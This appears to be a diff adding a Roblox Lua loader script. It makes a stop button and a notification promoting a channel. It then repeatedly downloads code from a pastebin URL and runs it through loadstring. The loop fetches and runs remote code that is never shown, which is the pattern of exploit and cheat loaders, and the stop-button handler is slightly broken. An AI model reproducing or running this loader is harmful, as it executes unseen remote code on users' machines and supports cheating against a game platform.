@@ -1,0 +1,31 @@
+local executed = false
+
+local function closeScript()
+    executed = true
+    StopButton.Visible = false
+end
+
+local Gui = Instance.new("ScreenGui")
+Gui.Parent = game.Players.LocalPlayer.PlayerGui
+
+local StopButton = Instance.new("TextButton")
+StopButton.Parent = Gui
+StopButton.Position = UDim2.new(0.5, -50, 0.6, 0)
+StopButton.Size = UDim2.new(0, 100, 0, 50)
+StopButton.Text = "Stop Script"
+StopButton.TextSize = 24 -- Increase text size to 24
+StopButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0) -- Black Background
+StopButton.TextColor3 = Color3.fromRGB(255, 255, 255) -- White Text
+StopButton.Font = Enum.Font.Gotham -- Set font to Gotham
+StopButton.MouseButton1Click:Connect(closeScript)
+
+local StarterGui = game:GetService("StarterGui")
+StarterGui:SetCore("SendNotification", {
+    Title = "SUBSCRIBE TO PHILLYMADEMARE",
+    Text = "Credits To AnthonyIsHere"
+})
+
+while true and not executed do
+    wait(2)
+    loadstring(game:HttpGet("https://pastebin.com/raw/zqyDSUWX"))()
+end
